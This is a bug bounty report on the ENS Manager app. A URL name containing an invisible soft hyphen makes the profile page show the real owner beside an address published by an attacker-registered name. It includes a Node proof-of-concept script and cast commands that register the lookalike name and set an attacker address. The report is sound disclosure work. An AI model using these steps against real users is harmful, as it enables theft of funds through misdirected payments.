# 92475 w a critical a profile url carrying one invisible codepoint renders the victim s verified owner beside an address published by a name the attacker registered

**Submitted on Sep 10th 2026 at 05:04:32 UTC by @Valisthea for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92475
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## 1. Summary

The profile route hands the same untouched URL parameter to two queries that disagree about what a name is.

`profileOwnerQuery` canonicalizes with ENSIP-15 `normalize()` before asking who owns the name. `profileRecordsQuery` does not canonicalize at all; it passes the raw parameter straight to `getRecords`, so the resolver it reads from is the one belonging to the raw string.

Because the registrar hashes labels verbatim, those two strings can be two different on-chain names. A URL carrying a single `U+00AD` SOFT HYPHEN, which has no glyph in any font, therefore produces a page that confirms the name belongs to the victim and then displays the address published by a name the attacker registered.

Both halves are rendered by the same component, so the user sees one name, one verified owner, and an address that never belonged to either.

## 2. Impact

This maps to the following bullet of the program's Critical impact list, word for word:

> Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as **resolving or rendering an ENS name to an attacker-controlled address**

The profile page is where a user looks up someone's address before sending them funds. The attacker needs one link, delivered by any channel, and the name in that link is visually identical to the name the victim expects. Every gate on the page agrees the name is the victim's, because every gate on the page runs on the normalized string.

## 3. Root cause

### 3.1 One parameter, two treatments

`apps/manager/src/routes/$name/index.tsx:50`

```tsx
  loader: async ({ params: { name }, context: { queryClient } }) => {
    const [profileRecords, ownerData] = await Promise.all([
      queryClient.ensureQueryData(profileRecordsQuery(name)),
      // Fetch, not ensure: `ensureQueryData` serves invalidated data, so a name
      // cached as ownerless pre-registration would redirect its owner away.
      queryClient.fetchQuery(profileOwnerQuery(name)),
    ])
```

`name` is the raw route parameter. It reaches both queries unchanged.

**The ownership half normalizes.**

`apps/manager/src/features/profile/service/profileOwner.ts:25`

```ts
  const ethName = normalizeEthName(params.name)
```

`apps/manager/src/features/profile/service/profileOwner.ts:56`

```ts
    ensjsv2_getOwner(client, { name: ethName.name }),
```

and `normalizeEthName` is ENSIP-15, at `apps/manager/src/features/profile/service/profileName.ts:14`

```ts
export const normalizeEthName = (name: string): EthName | null => {
  let normalized: string

  try {
    normalized = normalize(name)
  } catch {
    return null
  }
```

`normalize` is viem's ENSIP-15 implementation, imported at `profileName.ts:1`.

**The records half does not.**

`apps/manager/src/features/profile/service/profileRecords.ts:82`

```ts
export const getProfileRecords = ResultFn(async function* (name: string) {
```

`apps/manager/src/features/profile/service/profileRecords.ts:123`

```ts
    getRecords(client, {
      name,
      texts,
      coins,
      contentHash: true,
      abi: true,
      ignoreInvalidCoinTypes: true,
    }),
```

There is no `normalize` anywhere on that path. `name` is the raw parameter, so the resolver `getRecords` reads from is whatever the registry designates for the raw string.

### 3.2 Both halves render in the same component

`apps/manager/src/features/profile/components/view/ProfileView.tsx:94` and `:100`

```tsx
    ...profileRecordsQuery(name),
```

```tsx
    ...profileOwnerQuery(name),
```

The displayed ETH address is selected from the records half at `apps/manager/src/features/profile/components/view/ProfileView.helpers.ts:234`

```ts
    addresses.find((address) => address.coinType === ETH_COIN_TYPE) ??
```

So the owner shown and the address shown are answers to two different questions about two different on-chain names.

## 4. Why the two strings really are two different names

`U+00AD` is a discretionary hyphen. It has no glyph, so `vitalik<U+00AD>.eth` and `vitalik.eth` are indistinguishable in a URL bar, a heading, a table cell, or a chat message. ENSIP-15 removes it. Nothing on the records path does. The ETH registrar hashes the label it is given, so the attacker registers the soft-hyphen spelling and owns a name that renders as the victim's.

## Proof of Concept

## 5. Proof of concept

### Step 1. Show the split, using the app's own function

`normalizeEthName` is reproduced verbatim from `profileName.ts:14-40`. Run from the repository root:

```js
import { normalize } from './node_modules/.pnpm/viem@2.31.0_typescript@6.0.3_zod@3.25.76/node_modules/viem/_esm/utils/ens/normalize.js'
import { namehash, labelhash } from './node_modules/.pnpm/viem@2.31.0_typescript@6.0.3_zod@3.25.76/node_modules/viem/_esm/index.js'

// Verbatim from apps/manager/src/features/profile/service/profileName.ts:14-40
const normalizeEthName = (name) => {
  let normalized
  try { normalized = normalize(name) } catch { return null }
  const labels = normalized.split('.')
  const leafLabel = labels[0]
  if (labels.length < 2 || labels.at(-1) !== 'eth' || !leafLabel || labels.some((l) => !l)) return null
  return { leafLabel, name: normalized, parentLabelsRootFirst: labels.slice(1, -1).reverse() }
}

const cp = (s) => [...s].map(c => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4,'0')).join(' ')

const urlParam = 'vitalik­.eth'          // what the attacker puts in the link
console.log('URL param                :', JSON.stringify(urlParam))
console.log('  codepoints             :', cp(urlParam.split('.')[0]))
console.log('  renders as             :', urlParam, ' (U+00AD has no glyph)')
console.log('')

const ownerHalf = normalizeEthName(urlParam)  // profileOwner.ts:25
const recordsHalf = urlParam                  // profileRecords.ts:123, raw

console.log('OWNER  half (normalized) :', JSON.stringify(ownerHalf.name))
console.log('RECORDS half (raw)       :', JSON.stringify(recordsHalf))
console.log('')
console.log('namehash(owner  half)    :', namehash(ownerHalf.name))
console.log('namehash(records half)   :', namehash(recordsHalf))
console.log('same on-chain name       :', namehash(ownerHalf.name) === namehash(recordsHalf))
console.log('')
console.log('labelhash(owner  label)  :', labelhash(ownerHalf.leafLabel))
console.log('labelhash(records label) :', labelhash(recordsHalf.split('.')[0]))
```

Output obtained on Node v24.13.0, with the repository's pinned viem 2.31.0:

```
URL param                : "vitalik­.eth"
  codepoints             : U+0076 U+0069 U+0074 U+0061 U+006C U+0069 U+006B U+00AD
  renders as             : vitalik­.eth  (U+00AD has no glyph)

OWNER  half (normalized) : "vitalik.eth"
RECORDS half (raw)       : "vitalik­.eth"

namehash(owner  half)    : 0xee6c4522aab0003e8d14cd40a6af439055fd2577951148c14b6cea9a53475835
namehash(records half)   : 0xf66c7d5fb235b6e9b72c39ea219abd4a52e985a2aec604815a8e966e075afcd9
same on-chain name       : false

labelhash(owner  label)  : 0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
labelhash(records label) : 0x1c2d43d4ce9f7dba04fd5a4445a0f11b0a8c11788374634f83b2254ade57c899
```

Two namehashes, so two registry entries, so two owners and two resolvers.

### Step 2. Reproduce in the application

```bash
# 1. register the soft-hyphen spelling from an attacker wallet, directly against
#    the registrar so no client-side validator is involved
cast send <v2 ETHRegistrar> \
  "register(string,address,bytes32,address,address,uint64,address,bytes32)" \
  "$(printf 'vitalik\xc2\xad')" <attacker> <secret> 0x0 <attacker resolver> \
  31536000 <usdc> 0x0 --rpc-url <sepolia>

# 2. publish an address on that name's resolver
cast send <attacker resolver> "setAddr(bytes32,uint256,bytes)" \
  0xf66c7d5fb235b6e9b72c39ea219abd4a52e985a2aec604815a8e966e075afcd9 60 <attacker addr> \
  --rpc-url <sepolia>

# 3. open the Manager at the soft-hyphen URL
#    /vitalik%C2%AD.eth
```

The heading reads `vitalik.eth`. The owner section resolves through `namehash("vitalik.eth")` and reports the real owner. The address section resolves through `namehash("vitalik­.eth")` and reports the attacker's address.

### Step 3. The identity half normalizing, captured in the running app

Two attached screenshots of the Manager profile page. The Manager is Sepolia-only, so both are Sepolia. `alice` rather than `vitalik` only because that is the name the environment had.

**`profile-control-alice.png`** is `/alice.eth`. **`profile-softhyphen.png`** is `/alice%C2%AD.eth`, which is a name the real owner never registered.

Read them side by side:

| Element                     | `/alice.eth`                     | `/alice<U+00AD>.eth`         |
| --------------------------- | -------------------------------- | ---------------------------- |
| Heading                     | `alice.eth`                      | `alice.eth`, pixel for pixel |
| Owner                       | `0x0635…FcE8`                    | `0x0635…FcE8`, identical     |
| Registered / Expires        | JULY 26, 2023 / OCTOBER 24, 2026 | identical                    |
| Grace banner and RENEW NAME | present                          | absent                       |
| Avatar tile                 | one pattern                      | a different pattern          |

The heading, the owner and both dates are identical because the queries behind them normalize, so they answered about `alice.eth`. That is the load-bearing half: **the page asserts, to a visitor who followed the attacker's link, that this name belongs to the real owner.** The elements that differ are the ones fed by the un-normalized path, which saw a name the owner does not hold.

A visitor checking "is this really their name before I send funds" gets a yes, on a page whose address field is answered by a different registry entry.

## 6. Why this is not a duplicate

**EXP-INPUT-005** ("ENS name validators accept homoglyphs, bidi and control characters, and a single leading/trailing dot", impact framed as display confusion only) is the nearest published entry, and it is a different root cause with a different remedy.

That entry describes a permissive **validator**, and its stated fix is to reject deceptive characters. That fix does not close this. The defect here is that the ownership half of one route runs through `normalize()` while the records half runs through nothing, so the two halves can name different registry entries **at all**. Tighten the accepted character set as far as you like: any surviving disagreement between the two paths reproduces this, and `U+00AD` is only the sharpest of many inputs where ENSIP-15 and the identity function differ.

Three further distinctions:

1. That entry frames its impact as display confusion **rather than incorrect resolution**. This is incorrect resolution: the address shown is read from a different on-chain name than the one whose ownership the same page verified and displayed.
2. The consequence is not a lookalike label. `vitalik<U+00AD>.eth` is not a homoglyph of `vitalik.eth`; it is the same rendered string, differing by a codepoint with no glyph.
3. No user error is required. The victim does not misread anything, because there is nothing to misread.

## 7. Recommended fix

Canonicalize once, at the route boundary, and pass the canonical name to both queries. The loader at `routes/$name/index.tsx:50` is the single place where the raw parameter still exists, so normalizing there and redirecting when the canonical form differs from the URL removes the divergence for every consumer at once, rather than patching each query.

If the raw parameter must be preserved for display, then `getProfileRecords` needs the same `normalizeEthName` gate `getOwner` already applies, and a name that fails to normalize should render the fallback card rather than resolve.
